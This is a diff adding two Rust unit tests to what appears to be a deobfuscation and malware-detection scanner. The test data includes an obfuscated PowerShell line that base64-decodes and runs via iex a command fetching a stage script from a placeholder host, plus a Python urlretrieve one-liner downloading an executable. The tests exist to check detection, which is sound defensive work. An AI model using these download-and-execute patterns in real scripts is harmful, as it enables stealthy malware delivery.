@@ -8578,6 +8578,30 @@ mod ps1_obfuscation_tests {
     }
 
     #[test]
+    fn ps1_normalization_decodes_replace_cleaned_getstring_base64_variable() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://b64-var-replace.example/stage.ps1";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let midpoint = b64.len() / 2;
+        let noisy = format!("{}XYZmarker{}", &b64[..midpoint], &b64[midpoint..]);
+        let ps = format!(
+            "$blob = '{noisy}'.Replace('XYZmarker',''); $stage = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($blob)); iex $stage"
+        );
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+        assert!(
+            normalized.contains("https://b64-var-replace.example/stage.ps1"),
+            "Replace-cleaned base64 variable script was not decoded:\n{}",
+            normalized
+        );
+        assert!(
+            !normalized.contains("FromBase64String($blob)"),
+            "Replace-cleaned base64 variable GetString call should be replaced:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
     fn ps1_normalization_decodes_parenthesized_getstring_base64_variable() {
         use base64::Engine;
 
@@ -10983,6 +11007,38 @@ $urlzip = "https://ps.example/stage.zip""#,
         assert_eq!(
             generic_count, 0,
             "Python urllib URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_urllib_urlretrieve_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import urllib.request; urllib.request.urlretrieve('https://py.example/file.exe', 'file.exe')""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/file.exe" && dst.as_deref() == Some("file.exe")
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python urllib urlretrieve: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/file.exe")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python urlretrieve URL double-emitted: {:?}",
             env.traits
         );
     }
